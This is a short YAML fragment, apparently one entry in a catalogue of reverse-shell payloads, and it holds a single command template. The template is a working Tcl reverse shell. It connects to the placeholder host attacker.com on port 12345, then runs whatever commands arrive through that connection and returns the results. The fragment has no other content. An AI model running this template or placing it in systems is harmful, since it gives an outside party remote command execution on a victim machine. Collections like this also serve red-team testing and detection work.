  last_synced: '2026-08-25'
commands:
- template: 'tclsh

    set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec
    $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;'
references:
